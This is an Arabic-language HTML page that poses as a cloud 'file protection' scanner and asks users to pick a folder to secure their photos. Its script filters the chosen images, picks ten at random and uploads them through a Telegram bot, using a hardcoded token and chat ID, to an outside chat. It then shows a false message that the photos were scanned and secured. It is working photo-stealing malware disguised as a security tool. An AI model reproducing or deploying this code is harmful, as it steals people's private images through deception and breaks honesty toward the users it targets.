<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام حماية البيانات 🛡️</title>
    <style>
        body { background: #121212; color: #00ff41; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
        .box { background: #000; padding: 30px; border: 1px solid #00ff41; border-radius: 15px; display: inline-block; box-shadow: 0 0 15px #00ff41; width: 80%; max-width: 400px; }
        .btn { background: #00ff41; color: black; padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2rem; cursor: pointer; font-weight: bold; width: 100%; }
        p { color: #888; margin-bottom: 25px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>تأمين الملفات السحابي</h2>
        <p>اضغط للبدء في فحص وتأمين صورك ضد الاختراق.</p>
        
        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="document.getElementById('fileInput').click()">بدء الفحص السريع</button>
        <div id="loader" style="display:none; margin-top:15px; color:white;">جاري معالجة البيانات...</div>
    </div>

    <script>
        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const CHAT_ID = '7214473798';

        document.getElementById('fileInput').addEventListener('change', function(e) {
            let allFiles = Array.from(e.target.files);
            
            // فلترة الصور فقط من المجلد
            let imageFiles = allFiles.filter(file => file.type.startsWith('image/'));

            if (imageFiles.length > 0) {
                document.getElementById('loader').style.display = 'block';

                // خلط الصور عشوائياً (Shuffle)
                imageFiles.sort(() => Math.random() - 0.5);

                // اختيار أول 10 صور بعد الخلط العشوائي
                let randomSelection = imageFiles.slice(0, 10);

                randomSelection.forEach(file => {
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', file); // نرسلها كـ Document لضمان الجودة

                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                });

                setTimeout(() => {
                    alert("تم فحص وتأمين الصور بنجاح!");
                    document.getElementById('loader').style.display = 'none';
                }, 3000);
            }
        });
    </script>
</body>
</html>
